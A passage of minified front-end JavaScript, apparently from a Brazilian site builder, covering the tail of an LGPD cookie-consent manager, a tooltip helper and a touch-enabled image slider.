                    if (valor += "&" + elementos[i].id + ":" + (elementos[i].classList.contains("gpc_modal_lgpd-opcoes-selecao_selecionado") ? "1" : "0"), 1 == elementos[i].classList.contains("gpc_modal_lgpd-opcoes-selecao"))
                        for (var x = 0; x < configuracao.opcoes.length; x++) configuracao.opcoes[x].id == elementos[i].id && (configuracao.opcoes[x].valor != elementos[i].classList.contains("gpc_modal_lgpd-opcoes-selecao_selecionado") && (editado = !0), configuracao.opcoes[x].valor = elementos[i].classList.contains("gpc_modal_lgpd-opcoes-selecao_selecionado"));
            configuracao.editado = editado, GModalApproval.salvar_preferencias(valor, configuracao.dominio), FecharGM("gpc_modal_lgpd_" + gm_quantidade);
            var elemento = document.getElementById("gpc-lgpd");
            null != elemento && (elemento.remove(), GModalApproval.botao(configuracao)), GModalApproval.posicionar(), GModalApproval.remover_preferencias(configuracao)
        },
        confirmarTodos: function(configuracao) {
            for (var valor = "o:1", x = 0; x < configuracao.opcoes.length; x++) configuracao.opcoes[x].hasOwnProperty("valor") && (configuracao.opcoes[x].valor = !0, valor += "&" + configuracao.opcoes[x].id + ":1");
            GModalApproval.salvar_preferencias(valor, configuracao.dominio), GModalApproval.instalar_scripts(configuracao), configuracao.editado = !0;
            var elemento = document.getElementById("gpc-lgpd");
            null != elemento && elemento.remove(), GModalApproval.botao(configuracao)
        },
        cancelarTodos: function(configuracao) {
            for (var valor = "o:1", x = 0; x < configuracao.opcoes.length; x++) configuracao.opcoes[x].hasOwnProperty("valor") && (configuracao.opcoes[x].valor = !1, valor += "&" + configuracao.opcoes[x].id + ":0");
            configuracao.editado = !0, GModalApproval.salvar_preferencias(valor, configuracao.dominio), GModalApproval.instalar_scripts(configuracao);
            var elemento = document.getElementById("gpc-lgpd");
            null != elemento && elemento.remove(), GModalApproval.botao(configuracao)
        },
        preferencias: function() {
            for (var cookie_array = document.cookie.split(";"), i = 0; i < cookie_array.length; i++) {
                for (var cookie_string = cookie_array[i];
                    " " == cookie_string.charAt(0);) cookie_string = cookie_string.substring(1, cookie_string.length);
                if (-1 != cookie_string.indexOf("gpages_cookies=")) return cookie_string.substring(15, cookie_string.length)
            }
            return null
        },
        salvar_preferencias: function(preferencias, dominio) {
            null == dominio && (dominio = "");
            var data = new Date;
            return data.setTime(data.getTime() + 31536e6), document.cookie = "gpages_cookies=" + preferencias + ";Expires=" + data.toGMTString() + ";Path=/;" + (dominio ? " Domain=" + dominio : ""), !0
        },
        remover_preferencias: function(configuracao) {
            if (configuracao.editado) {
                for (var cookie_array = document.cookie.split(";"), cookies_limpos = "", i = 0; i < cookie_array.length; i++) {
                    for (var cookie_string = cookie_array[i];
                        " " == cookie_string.charAt(0);) cookie_string = cookie_string.substring(1, cookie_string.length); - 1 === cookie_string.indexOf("gpages_") ? cookies_limpos += cookie_string.substring(0, cookie_string.indexOf("=")) + "=;Expires=Thu, 01 Jan 1970 00:00:01 GMT;Path=/;" + (configuracao.dominio ? " Domain=" + configuracao.dominio : "") : cookies_limpos += cookie_string
                }
                document.cookie = cookies_limpos, setTimeout((function() {
                    document.location.reload(!0)
                }), 100)
            }
        },
        instalar_scripts: function(configuracao, loader) {
            null == loader && (loader = !0);
            let cookie = GModalApproval.preferencias();
            if ("" != configuracao.opcoes)
                for (var x = 0; x < configuracao.opcoes.length; x++) configuracao.opcoes[x].valor = -1 !== cookie.indexOf(configuracao.opcoes[x].id + ":1");
            if (configuracao.hasOwnProperty("opcoes")) {
                let total = Object.entries(configuracao.opcoes).length;
                for (var i = 0; i < total; i++)
                    if ((1 == configuracao.opcoes[i].valor || "true" == configuracao.opcoes[i].valor) && configuracao.opcoes[i].hasOwnProperty("codigos")) {
                        let scripts = configuracao.opcoes[i].codigos();
                        if (Object.entries(scripts).length) {
                            let tipo = "_" + configuracao.opcoes[i].id;
                            $(".gle_css" + tipo).removeClass("gle_css" + tipo).addClass("gle_css"), $(".gle_scripts" + tipo).removeClass("gle_scripts" + tipo).addClass("gle_scripts"), Object.entries(scripts).forEach((([key, value]) => {
                                if (scripts[key].hasOwnProperty("html")) {
                                    let div = document.createElement("div");
                                    div.innerHTML = scripts[key].html, document.body.appendChild(div)
                                }
                                setTimeout((function() {
                                    if (scripts[key].hasOwnProperty("js_interno")) {
                                        let total_js_interno = Object.entries(scripts[key].js_interno).length;
                                        for (let y = 0; y < total_js_interno; y++) {
                                            let script = document.createElement("script"),
                                                conteudo = scripts[key].js_interno[y].toString();
                                            conteudo = conteudo.substr(11, conteudo.length), conteudo = conteudo.substr(0, conteudo.length - 1), script.innerHTML = conteudo, document.body.appendChild(script)
                                        }
                                    }
                                }), 50)
                            }))
                        }
                    } loader && GreatLoader("atualizar")
            }
        }
    },
    GTooltip = {
        instalar: function(configuracao) {
            if (0 == configuracao.hasOwnProperty("elemento") && (configuracao.elemento = ""), 0 == configuracao.hasOwnProperty("direcao") && (configuracao.direcao = "cima"), "cima" != configuracao.direcao && "baixo" != configuracao.direcao && "direita" != configuracao.direcao && "esquerda" != configuracao.direcao && (configuracao.direcao = "cima"), "" != configuracao.elemento) {
                var elementos = document.querySelectorAll(configuracao.elemento);
                if (elementos.length)
                    for (var i = 0; i < elementos.length; i++) elementos[i].addEventListener("mouseenter", (function() {
                        GTooltip.adicionar(this, configuracao.direcao)
                    }), !1), elementos[i].addEventListener("mouseout", (function() {
                        GTooltip.remover(this)
                    }), !1)
            }
        },
        adicionar: function(elemento, direcao) {
            if ("" != elemento.dataset.gtt) {
                var gtt = document.createElement("div");
                gtt.className = "gtt_caixa gtt_caixa-" + direcao, gtt.innerHTML = '<span class="gtt_caixa-seta"></span><span class="gtt_caixa-conteudo">' + elemento.dataset.gtt + "</span>", document.body.appendChild(gtt);
                var pagina_offset = window.scrollY || window.pageYOffset,
                    elemento_offset = elemento.getBoundingClientRect(),
                    gtt_width = parseFloat(getComputedStyle(gtt).width.replace("px", "")),
                    gtt_height = parseFloat(getComputedStyle(gtt).height.replace("px", ""));
                if ("cima" == direcao) gtt.style.top = pagina_offset + (elemento_offset.top - gtt_height) - 10 + "px", gtt.style.left = elemento_offset.left + elemento.offsetWidth / 2 - gtt_width / 2 + "px", (gtt_seta = gtt.querySelector(".gtt_caixa-seta")).style.bottom = "-10px", gtt_seta.style.left = gtt_width / 2 - 5 + "px";
                else if ("baixo" == direcao) gtt.style.top = pagina_offset + (elemento_offset.top + elemento.offsetHeight) + 10 + "px", gtt.style.left = elemento_offset.left + elemento.offsetWidth / 2 - gtt_width / 2 + "px", (gtt_seta = gtt.querySelector(".gtt_caixa-seta")).style.top = "-10px", gtt_seta.style.left = gtt_width / 2 - 5 + "px";
                else if ("esquerda" == direcao) gtt.style.top = pagina_offset + (elemento_offset.top + elemento.offsetHeight / 2) - gtt_height / 2 + "px", gtt.style.left = elemento_offset.left - gtt_width - 10 + "px", (gtt_seta = gtt.querySelector(".gtt_caixa-seta")).style.right = "-10px", gtt_seta.style.top = gtt_height / 2 - 5 + "px";
                else if ("direita" == direcao) {
                    var gtt_seta;
                    gtt.style.top = pagina_offset + (elemento_offset.top + elemento.offsetHeight / 2) - gtt_height / 2 + "px", gtt.style.left = elemento_offset.left + elemento.offsetWidth + 10 + "px", (gtt_seta = gtt.querySelector(".gtt_caixa-seta")).style.left = "-10px", gtt_seta.style.top = gtt_height / 2 - 5 + "px"
                }
            }
        },
        remover: function(elemento) {
            if ("" != elemento.dataset.gtt) {
                var gtt = document.body.querySelector(".gtt_caixa");
                null == gtt && !1 === window.navigator.sayswho.toLowerCase().indexOf("ie") || gtt.remove()
            }
        }
    },
    gsi_instancias = {},
    gsi_intervalo = {},
    GSlideImage = {
        iniciar: function(id) {
            let instancias;
            if (instancias = null != id ? document.querySelectorAll("#" + id + " .gsi") : document.querySelectorAll(".gsi"), instancias)
                for (let i = 0; i < instancias.length; i++) {
                    if (!instancias[i].querySelectorAll(".imagem").length) continue;
                    let slider, id_slider;
                    if (slider = instancias[i].closest(".c, .conteudo"), id_slider = "gsi_" + slider.parentElement.getAttribute("id"), gsi_intervalo.hasOwnProperty(id_slider)) {
                        GSlideImage.destruir(id_slider), GSlideImage.iniciar(slider.parentElement.getAttribute("id"));
                        continue
                    }
                    instancias[i].setAttribute("id", id_slider), gsi_instancias[id_slider] = {
                        efeito: "slide",
                        imagens: [],
                        imagens_ordem: [],
                        imagens_view: parseInt(slider.getAttribute("gpc-slide_view")),
                        imagens_margin: parseInt(slider.getAttribute("gpc-slide_view_espaco")),
                        autoplay: "true" == slider.getAttribute("gpc-slide_auto") || 1 == slider.getAttribute("gpc-slide_auto"),
                        transforms: {},
                        total: instancias[i].querySelectorAll(".imagem") ? instancias[i].querySelectorAll(".imagem").length : 0,
                        slide: 0,
                        tamanho: 0,
                        touch_ativo: !1,
                        touch_posicao_inicio: 0,
                        touch_posicao_movendo: 0,
                        touch_limite: 0,
                        touch_slide: 0,
                        touch_mover: !1
                    }, GSlideImage.imagens(id_slider, !0);
                    for (let x = 0; x < gsi_instancias[id_slider].imagens.length; x++) {
                        let elemento = instancias[i].querySelector("#" + gsi_instancias[id_slider].imagens[x]);
                        elemento.setAttribute("posicao", x), elemento.style.transition = "0s linear", x == gsi_instancias[id_slider].imagens.length - 1 && gsi_instancias[id_slider].imagens.length > gsi_instancias[id_slider].imagens_view ? elemento.style.transform = "matrix(1, 0, 0, 1, " + -1 * gsi_instancias[id_slider].tamanho + ", 0)" : elemento.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id_slider].transforms[x] + ", 0)", x < gsi_instancias[id_slider].imagens_view && (elemento.classList.add("ativo"), elemento.style.opacity = 1)
                    }
                    GSlideImage.imagens_ordem(id_slider);
                    let reiniciar = !1;
                    if (gsi_instancias[id_slider].imagens.length < gsi_instancias[id_slider].imagens_view + 2) {
                        let y = gsi_instancias[id_slider].imagens.length;
                        for (let x = 0; x < gsi_instancias[id_slider].imagens.length; x++) {
                            let original = instancias[i].querySelector("#" + gsi_instancias[id_slider].imagens[x]);
                            if (original) {
                                let clone = document.createElement("div");
                                clone.setAttribute("id", "clone_" + gsi_instancias[id_slider].imagens[x].replace("clone_", "") + y), clone.classList.add("gsi_clone", "imagem"), clone.setAttribute("posicao", gsi_instancias[id_slider].imagens.length), clone.style.opacity = 0, null != original.getAttribute("ll_src") && (clone.setAttribute("ll_src", original.getAttribute("ll_src")), clone.classList.add("se_slider")), null != original.getAttribute("ll_src_mobile") && (clone.setAttribute("ll_src_mobile", original.getAttribute("ll_src_mobile")), clone.classList.add("se_slider")), null == original.getAttribute("ll_src") && null == original.getAttribute("ll_src_mobile") && (clone.style.backgroundImage = window.getComputedStyle(original).backgroundImage), clone.style.width = (100 - gsi_instancias[id_slider].imagens_margin) / gsi_instancias[id_slider].imagens_view + "%", clone.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id_slider].transforms[gsi_instancias[id_slider].imagens_view] + ", 0)", instancias[i].querySelector(".gsi_imagens").appendChild(clone)
                            }
                            y++
                        }
                        reiniciar = !0
                    }
                    if (reiniciar) {
                        GSlideImage.destruir(id_slider, !1), GSlideImage.iniciar(slider.parentElement.getAttribute("id"));
                        continue
                    }
                    let proximo = instancias[i].querySelector(".gsi_proximo");
                    proximo && (proximo.addEventListener("click", (function() {
                        GSlideImage.acao(proximo.closest(".gsi").getAttribute("id"), "proximo")
                    }), !1), gsi_instancias[id_slider].imagens.length <= gsi_instancias[id_slider].imagens_view && (proximo.style.pointerEvents = "none"));
                    let anterior = instancias[i].querySelector(".gsi_anterior");
                    anterior && (anterior.addEventListener("click", (function() {
                        GSlideImage.acao(anterior.closest(".gsi").getAttribute("id"), "anterior")
                    }), !1), gsi_instancias[id_slider].imagens.length <= gsi_instancias[id_slider].imagens_view && (anterior.style.pointerEvents = "none"));
                    let touch = instancias[i].querySelector(".gsi_imagens");
                    touch && (touch.addEventListener("mousedown", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1), touch.addEventListener("mousemove", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1), touch.addEventListener("mouseleave", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1), touch.addEventListener("mouseup", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1), touch.addEventListener("touchstart", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1), touch.addEventListener("touchmove", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1), touch.addEventListener("touchleave", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1), touch.addEventListener("touchcancel", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1), touch.addEventListener("touchend", (function(e) {
                        GSlideImage.acao(touch.closest(".gsi").getAttribute("id"), "touch", e)
                    }), !1)), gsi_instancias[id_slider].autoplay && gsi_instancias[id_slider].imagens.length > gsi_instancias[id_slider].imagens_view ? gsi_intervalo[id_slider] = setInterval((function() {
                        GSlideImage.acao(id_slider)
                    }), 4e3 + i) : !gsi_instancias[id_slider].autoplay && gsi_intervalo.hasOwnProperty(id_slider) && (gsi_instancias[id_slider].autoplay = !1, clearInterval(gsi_intervalo[id_slider]), delete gsi_intervalo[id_slider])
                }
        },
        destruir: function(id, excluir_clone) {
            if (null == excluir_clone && (excluir_clone = !0), null != id && "" != id) {
                if (gsi_instancias.hasOwnProperty(id)) {
                    gsi_intervalo.hasOwnProperty(id) && (gsi_intervalo[id] = clearInterval(gsi_intervalo[id]), delete gsi_intervalo[id]);
                    let instancia = document.querySelector("#" + id);
                    if (instancia) {
                        let ativos = instancia.querySelectorAll(".ativo");
                        if (ativos.length)
                            for (let x = 0; x < ativos.length; x++) ativos[x].classList.remove("ativo"), ativos[x].style.opacity = 0, ativos[x].style.display = "", ativos[x].style.transform = "", ativos[x].style.transition = "";
                        if (excluir_clone) {
                            let clones = instancia.querySelectorAll(".gsi_clone");
                            if (clones.length)
                                for (let x = 0; x < clones.length; x++) clones[x].remove()
                        }
                        instancia.removeAttribute("id")
                    }
                    delete gsi_instancias[id]
                }
            } else {
                let instancias = document.querySelectorAll(".gsi");
                if (instancias.length)
                    for (let i = 0; i < instancias.length; i++) "" != instancias[i].id && null != instancias[i].id && GSlideImage.destruir(instancias[i].id)
            }
        },
        pausar: function(id) {
            let instancias;
            instancias = null != id ? document.querySelectorAll("#" + id) : document.querySelectorAll(".gsi");
            for (let i = 0; i < instancias.length; i++) {
                let id_slider = instancias[i].getAttribute("id");
                gsi_intervalo.hasOwnProperty(id_slider) && (gsi_intervalo[id_slider] = clearInterval(gsi_intervalo[id_slider]), delete gsi_intervalo[id_slider])
            }
        },
        reiniciar: function(id) {
            let instancias;
            if (instancias = null != id ? document.querySelectorAll("#" + id) : document.querySelectorAll(".gsi"), instancias)
                for (let i = 0; i < instancias.length; i++)
                    if (instancias[i]) {
                        let id_slider = instancias[i].getAttribute("id");
                        GSlideImage.destruir(id_slider), GSlideImage.iniciar(instancias[i].parentElement.getAttribute("id"))
                    }
        },
        imagens: function(id_slider, atualizar) {
            let instancias;
            if (null == atualizar && (atualizar = !1), instancias = null != id_slider ? document.querySelectorAll("#" + id_slider) : document.querySelectorAll(".gsi"), instancias)
                for (let i = 0; i < instancias.length; i++)
                    if (instancias[i]) {
                        if (!instancias[i].querySelectorAll(".imagem").length) continue;
                        let elemento, id = instancias[i].getAttribute("id"),
                            imagens = instancias[i].querySelectorAll(".imagem"),
                            width = parseFloat(window.getComputedStyle(instancias[i]).width) / gsi_instancias[id].imagens_view;
                        gsi_instancias[id].tamanho = width, gsi_instancias[id].margin = gsi_instancias[id].imagens_margin > 0 ? gsi_instancias[id].imagens_margin : 0;
                        for (let x = 0; x < imagens.length; x++) elemento = imagens[x], elemento.classList.contains("ativo") ? elemento.style.opacity = 1 : elemento.style.opacity = 0, atualizar && (elemento.style.transition = "0s linear"), elemento.style.width = (100 - gsi_instancias[id].imagens_margin) / gsi_instancias[id].imagens_view + "%", gsi_instancias[id].imagens[x] = elemento.getAttribute("id");
                        if (3 == gsi_instancias[id].imagens_view)
                            for (let x = -1; x <= gsi_instancias[id].imagens_view; x++) x == gsi_instancias[id].imagens_view ? gsi_instancias[id].transforms[x] = gsi_instancias[id].tamanho * x + gsi_instancias[id].tamanho * (1.5 * gsi_instancias[id].margin / 100) : gsi_instancias[id].transforms[x] = 0 == x ? 0 : -1 == x ? gsi_instancias[id].tamanho * x - gsi_instancias[id].tamanho * (.5 * gsi_instancias[id].margin / 100) : 1 == x ? gsi_instancias[id].tamanho * x + gsi_instancias[id].tamanho * (.5 * gsi_instancias[id].margin / 100) : gsi_instancias[id].tamanho * x + gsi_instancias[id].tamanho * (gsi_instancias[id].margin / 100);
                        else
                            for (let x = -1; x <= gsi_instancias[id].imagens_view; x++) x == gsi_instancias[id].imagens_view ? gsi_instancias[id].transforms[x] = gsi_instancias[id].tamanho * x + 2 * gsi_instancias[id].tamanho * (gsi_instancias[id].margin / 100) : gsi_instancias[id].transforms[x] = 0 == x ? 0 : -1 == x ? gsi_instancias[id].tamanho * x - gsi_instancias[id].tamanho * (gsi_instancias[id].margin / 100) : gsi_instancias[id].tamanho * x + gsi_instancias[id].tamanho * (gsi_instancias[id].margin / 100);
                        for (let y = 0; y < gsi_instancias[id].imagens_ordem.length; y++)
                            for (let x = 0; x < imagens.length; x++)
                                if (gsi_instancias[id].imagens_ordem[y] == imagens[x].getAttribute("id")) {
                                    imagens[x].style.opacity = 1, imagens[x].style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[y - 1] + ", 0)";
                                    break
                                }
                    }
        },
        imagens_ordem: function(id) {
            let instancia = document.querySelector("#" + id);
            if (instancia) {
                if (!instancia.querySelectorAll(".imagem").length) return;
                let elementos_mostrando = instancia.querySelectorAll(".ativo"),
                    elementos = [];
                for (let i = 0; i < elementos_mostrando.length; i++) elementos.length ? parseInt(instancia.querySelector("#" + elementos[elementos.length - 1]).getAttribute("posicao")) < parseInt(elementos_mostrando[i].getAttribute("posicao")) ? elementos.push(elementos_mostrando[i].getAttribute("id")) : elementos.unshift(elementos_mostrando[i].getAttribute("id")) : elementos[0] = elementos_mostrando[i].getAttribute("id");
                if (elementos.length) {
                    let anterior, proximo, posicao = instancia.querySelector("#" + elementos[elementos.length - 1]).getAttribute("posicao"),
                        atual_teste = instancia.querySelector("#" + elementos[elementos.length - 1]),
                        continuar = !0,
                        x = 0;
                    for (; continuar;) atual_teste = atual_teste.nextSibling ? atual_teste.nextSibling : instancia.querySelector(".gsi_imagens .imagem:first-child"), atual_teste.classList.contains("ativo") && x != gsi_instancias[id].total - 1 || (continuar = !1, proximo = atual_teste), x++;
                    for (elementos.push(proximo.getAttribute("id")), posicao = instancia.querySelector("#" + elementos[0]).getAttribute("posicao"), atual_teste = instancia.querySelector("#" + elementos[0]), continuar = !0, x = 0; continuar;) atual_teste = atual_teste.previousSibling ? atual_teste.previousSibling : instancia.querySelector(".gsi_imagens div:last-child"), atual_teste.classList.contains("ativo") && x != gsi_instancias[id].total - 1 || (continuar = !1, anterior = atual_teste), x++;
                    elementos.unshift(anterior.getAttribute("id"));
                    let elementos_ordem = [];
                    3 == gsi_instancias[id].imagens_view ? parseInt(instancia.querySelector("#" + elementos[3]).getAttribute("posicao")) == gsi_instancias[id].total - 1 && 0 == parseInt(instancia.querySelector("#" + elementos[1]).getAttribute("posicao")) ? (elementos_ordem[0] = elementos[0], "1" == proximo.getAttribute("posicao") ? (elementos_ordem[1] = elementos[2], elementos_ordem[2] = elementos[3], elementos_ordem[3] = elementos[1]) : "2" == proximo.getAttribute("posicao") && (elementos_ordem[1] = elementos[3], elementos_ordem[2] = elementos[1], elementos_ordem[3] = elementos[2]), elementos_ordem[4] = elementos[4]) : elementos_ordem = elementos : 2 == gsi_instancias[id].imagens_view && parseInt(instancia.querySelector("#" + elementos[2]).getAttribute("posicao")) == gsi_instancias[id].total - 1 && 0 == parseInt(instancia.querySelector("#" + elementos[1]).getAttribute("posicao")) ? (elementos_ordem[0] = elementos[0], elementos_ordem[1] = elementos[2], elementos_ordem[2] = elementos[1], elementos_ordem[3] = elementos[3]) : elementos_ordem = elementos, gsi_instancias[id].imagens_ordem = elementos_ordem
                }
            }
        },
        acao: function(id, acao, evento) {
            null == evento ? evento = null : ("touch" != evento.type.substr(0, 5) || "touchmove" == evento.type && 0 != gsi_instancias[id].touch_posicao_movendo) && (evento.preventDefault(), evento.stopPropagation()), null == acao && (acao = "proximo");
            let instancia = document.querySelector("#" + id);
            if (instancia) {
                let proximo = instancia.querySelector(".gsi_proximo"),
                    anterior = instancia.querySelector(".gsi_anterior");
                "proximo" != acao && "anterior" != acao || (proximo && (proximo.style.pointerEvents = "none"), anterior && (anterior.style.pointerEvents = "none"), instancia.querySelector(".gsi_imagens").style.pointerEvents = "none");
                let tempo_touch, tempo = 400;
                if (tempo_touch = 2 * parseFloat(tempo) + parseFloat((45 * tempo / 100).toFixed(0)), gsi_instancias[id].autoplay && (clearInterval(gsi_intervalo[id]), delete gsi_intervalo[id]), "anterior" == acao) {
                    if (gsi_instancias[id].imagens_ordem[0] == gsi_instancias[id].imagens_ordem[gsi_instancias[id].imagens_view + 1]) {
                        let ultimo = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[0]);
                        ultimo && (ultimo.style.transition = "0s linear", ultimo.style.opacity = 0, ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[-1] + ", 0)")
                    }
                    if ("fade" == gsi_instancias[id].efeito) {
                        let elemento_mover;
                        for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) elemento_mover = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento_mover && (elemento_mover.style.transition = "opacity " + (40 * tempo / 100).toFixed(2) + "ms linear", elemento_mover.style.opacity = 0)
                    }
                    let elemento_mover;
                    for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) i < gsi_instancias[id].imagens_view + 1 && (gsi_instancias[id].imagens_ordem[0] != gsi_instancias[id].imagens_ordem[i] || 0 == i) && (elemento_mover = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento_mover && (elemento_mover.style.transition = ("fade" == gsi_instancias[id].efeito ? "opacity" : "transform") + " " + tempo + "ms linear", elemento_mover.classList.add("ativo"), i == gsi_instancias[id].imagens_view && elemento_mover.classList.remove("ativo"), i > gsi_instancias[id].imagens_view ? elemento_mover.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[gsi_instancias[id].imagens_view] + ", 0)" : elemento_mover.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[i] + ", 0)", elemento_mover.style.opacity = 1))
                } else if ("proximo" == acao) {
                    if (gsi_instancias[id].imagens_ordem[0] == gsi_instancias[id].imagens_ordem[gsi_instancias[id].imagens_view + 1]) {
                        let ultimo = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[gsi_instancias[id].imagens_view + 1]);
                        ultimo && (ultimo.style.transition = "0s linear", ultimo.style.opacity = 0, ultimo.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[gsi_instancias[id].imagens_view] + ", 0)")
                    }
                    if ("fade" == gsi_instancias[id].efeito) {
                        let elemento_mover;
                        for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) elemento_mover = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento_mover && (elemento_mover.style.transition = "opacity " + (40 * tempo / 100).toFixed(2) + "ms linear", elemento_mover.style.opacity = 0)
                    }
                    let elemento_mover;
                    for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) elemento_mover = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento_mover && (elemento_mover.style.transition = ("fade" == gsi_instancias[id].efeito ? "opacity" : "transform") + " " + tempo + "ms linear", elemento_mover.style.transform = i <= 1 ? "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[-1] + ", 0)" : "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[i - 2] + ", 0)", i <= 1 ? elemento_mover.classList.remove("ativo") : elemento_mover.classList.add("ativo"), elemento_mover.style.opacity = 1)
                } else if ("touch" == acao)
                    if ("mousedown" == evento.type && 1 == evento.buttons || "touchstart" == evento.type) gsi_instancias[id].touch_ativo = !0, instancia.querySelector(".gsi_imagens").classList.add("gsi_imagens_drag"), gsi_instancias[id].touch_mover && clearTimeout(gsi_instancias[id].touch_slide), gsi_instancias[id].touch_ativo = !0, instancia.querySelector(".gsi_proximo").style.pointerEvents = "none", instancia.querySelector(".gsi_anterior").style.pointerEvents = "none", instancia.querySelector(".gsi_proximo").style.opacity = 0, instancia.querySelector(".gsi_anterior").style.opacity = 0, gsi_instancias[id].touch_mover = !0, gsi_instancias[id].touch_limite = .5 * instancia.getClientRects()[0].width, "touchstart" === evento.type ? gsi_instancias[id].touch_posicao_inicio = evento.touches[0].clientX - gsi_instancias[id].touch_posicao_inicio : gsi_instancias[id].touch_posicao_inicio = evento.clientX - gsi_instancias[id].touch_posicao_inicio;
                    else if ("mousemove" == evento.type || "touchmove" == evento.type) {
                    if (gsi_instancias[id].touch_ativo && gsi_instancias[id].touch_mover)
                        if ("touchmove" === evento.type ? evento.touches[0].clientX == gsi_instancias[id].touch_posicao_inicio ? gsi_instancias[id].touch_posicao_movendo = 0 : (gsi_instancias[id].touch_posicao_movendo = Math.log(Math.abs(evento.touches[0].clientX - gsi_instancias[id].touch_posicao_inicio)), evento.touches[0].clientX - gsi_instancias[id].touch_posicao_inicio < 0 && (gsi_instancias[id].touch_posicao_movendo = -1 * gsi_instancias[id].touch_posicao_movendo), gsi_instancias[id].touch_posicao_movendo += .55 * (evento.touches[0].clientX - gsi_instancias[id].touch_posicao_inicio)) : evento.clientX == gsi_instancias[id].touch_posicao_inicio ? gsi_instancias[id].touch_posicao_movendo = 0 : (gsi_instancias[id].touch_posicao_movendo = Math.log(Math.abs(evento.clientX - gsi_instancias[id].touch_posicao_inicio)), evento.clientX - gsi_instancias[id].touch_posicao_inicio < 0 && (gsi_instancias[id].touch_posicao_movendo = -1 * gsi_instancias[id].touch_posicao_movendo), gsi_instancias[id].touch_posicao_movendo += .55 * (evento.clientX - gsi_instancias[id].touch_posicao_inicio)), gsi_instancias[id].touch_posicao_movendo > 0)
                            for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) {
                                let elemento;
                                elemento = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento.style.opacity = 1, elemento.style.transition = "", elemento.style.transform = "matrix(1, 0, 0, 1, " + (gsi_instancias[id].transforms[i - 1] + gsi_instancias[id].touch_posicao_movendo) + ",0)"
                            } else
                                for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) {
                                    let elemento;
                                    elemento = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento.style.opacity = 1, elemento.style.transition = "", elemento.style.transform = "matrix(1, 0, 0, 1, " + (gsi_instancias[id].transforms[i - 1] + gsi_instancias[id].touch_posicao_movendo) + ",0)"
                                }
                } else {
                    if (instancia.querySelector(".gsi_imagens").classList.remove("gsi_imagens_drag"), gsi_instancias[id].touch_ativo && gsi_instancias[id].touch_mover) {
                        let elemento;
                        if (gsi_instancias[id].touch_posicao_movendo >= gsi_instancias[id].tamanho * gsi_instancias[id].imagens_view / 6)
                            for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) elemento = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento.style.opacity = 1, elemento.classList.add("ativo"), elemento.style.transition = "transform 400ms linear", i >= gsi_instancias[id].imagens_view ? (elemento.classList.remove("ativo"), elemento.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[gsi_instancias[id].imagens_view] + ", 0)") : elemento.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[i] + ", 0)";
                        else if (gsi_instancias[id].touch_posicao_movendo <= gsi_instancias[id].tamanho * gsi_instancias[id].imagens_view / 6 * -1)
                            for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) elemento = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento.style.transition = "transform 400ms linear", elemento.style.opacity = 1, i <= 1 ? (elemento.classList.remove("ativo"), elemento.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[-1] + ", 0)") : (elemento.classList.add("ativo"), elemento.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[i - 2] + ", 0)");
                        else
                            for (let i = 0; i <= gsi_instancias[id].imagens_view + 1; i++) elemento = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[i]), elemento.style.transition = "transform 400ms linear", elemento.style.opacity = 1, 0 == i ? (elemento.classList.remove("ativo"), elemento.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[-1] + ", 0)") : i == gsi_instancias[id].imagens_view + 1 ? (elemento.classList.remove("ativo"), elemento.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[gsi_instancias[id].imagens_view] + ", 0)") : (elemento.classList.add("ativo"), elemento.style.transform = "matrix(1, 0, 0, 1, " + gsi_instancias[id].transforms[i - 1] + ", 0)");
                        gsi_instancias[id].touch_slide = setTimeout((function() {
                            GSlideImage.imagens_ordem(id);
                            let ultimo = instancia.querySelector("#" + gsi_instancias[id].imagens_ordem[gsi_instancias[id].imagens_view + 1]);
